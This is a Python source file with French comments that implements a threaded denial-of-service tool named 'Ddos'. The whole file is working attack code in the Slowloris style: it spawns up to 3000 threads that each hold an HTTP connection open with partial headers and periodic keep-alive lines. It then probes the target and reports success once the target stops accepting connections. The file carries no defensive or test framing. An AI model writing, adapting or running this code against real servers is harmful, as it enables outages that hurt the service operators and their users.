import socket
from threading import Thread
import time
import requests
import random
class Ddos(Thread):
    def __init__(self, ip, port, errorMax=100):
        Thread.__init__(self)
        self.errorMax = errorMax
        self.errorsCount = 0
        self.ip = ip
        self.port = int(port)

    def run(self):
        self.stop_threads = True
        i = 0
        self.mycount = 0
        pas = 100
        while (i < 3000) and (self.mycount < self.errorMax):
            for _ in range(pas):
                #création des threads par tranche de 50
                try:
                    thread = Thread(target=self.attack, args=(self.ip, self.port))
                    thread.start()
                except socket.error as e:
                    pass
            i+=pas
            self.mycount = 0
            time.sleep(1) #on attend 1seconde
            error = True
            while error and self.mycount < self.errorMax:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.ip, self.port))
                    sock.send(f"GET / HTTP/1.1\r\n".encode("utf-8"))
                    print("pas derreur. threads : ",i)
                    sock.close()
                    error = False
                except socket.error as e2:
                    self.mycount += 1
                    print("error", self.mycount)

        self.stop_threads=False
        self.data = dict()
        self.data['threads'] = i
        if (self.mycount < self.errorMax):
            self.data['result'] = "False"
        else:
            self.data['result'] = "True"

    def join(self):
        Thread.join(self)

        return self.data



    def attack(self, ip, port):
        while self.stop_threads:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(50)

                s.connect((ip, port))

                s.send(f"GET / HTTP/1.1\r\n".encode("utf-8"))
                ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
                s.send(f"User-Agent:{ua}".encode("utf-8"))
                s.send(f"Accept-language:en-US,en,q=0.5".encode("utf-8"))
                while self.stop_threads:
                    try:
                        time.sleep(10)
                        s.send(f"X-a:1".encode("utf-8")) #keep alive
                    except socket.error as e:
                        break
            except socket.error as e:
                pass
